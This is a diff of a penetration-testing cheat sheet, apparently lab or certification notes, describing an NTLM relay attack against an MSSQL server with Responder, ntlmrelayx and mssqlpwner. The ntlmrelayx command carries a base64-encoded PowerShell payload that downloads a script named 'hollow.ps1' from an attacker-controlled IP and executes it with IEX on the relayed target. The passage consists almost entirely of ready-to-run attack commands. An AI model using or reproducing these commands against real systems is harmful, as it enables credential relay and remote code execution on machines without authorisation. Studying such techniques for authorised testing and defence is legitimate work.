@@ -154,7 +154,7 @@ Enumerate an MSSQL instance:
 Relay authentication:
 *Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*
 ```
-mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>
-sudo responder -I tun0
 ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'powershell -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA4AC8AaABvAGwAbABvAHcALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA'
+sudo responder -I tun0 (make sure SMB is turned OFF in /etc/responder/Responder.conf)
+mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>
 ```
